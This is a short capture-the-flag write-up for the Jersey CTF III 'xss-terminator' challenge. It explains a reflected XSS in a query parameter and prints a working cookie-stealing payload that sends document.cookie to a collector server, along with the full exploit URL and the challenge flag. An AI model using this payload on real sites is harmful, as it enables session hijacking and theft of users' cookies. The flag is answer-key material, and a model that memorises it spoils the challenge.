---
title: Jersey CTF III - xss-terminator
date: 2023-04-17 09:55:30
tags:
---

```
The Terminator told you to put the cookie down, and you didn't listen. Now he is very 
angry! You must find a way to steal the cookie from the vulnerable website and send 
it to the evil server where the Terminator is waiting... just don't make him wait 
too long.
```

For this challenge, we're given two urls. The goal is to make the normal website at `http://198.211.99.71:3000/ ` send the document cookie over to `http://198.211.99.71:3001/cookie?data` (this is what the challenge explicitly tells us to do).

The normal website takes a query parameter q that it parses and places in the html. If you put it through the form on the site your text will be encoded, but if you paste it directly into the URI you can inject whatever sort of javascript you'd like. For example if we paste this as parameter q, we can send the document cookie over to the malicious site where the "terminator" is waiting.

```
<img src=x onerror=this.src='http://198.211.99.71:3001/cookie?data='+document.cookie;>

http://198.211.99.71:3000/?q=<img src=x onerror=this.src='http://198.211.99.71:3001/cookie?data='+document.cookie;>
```

Upon refreshing the page we're given the flag: `jctf{who_said_you_could_open_the_cookie_jar!?}`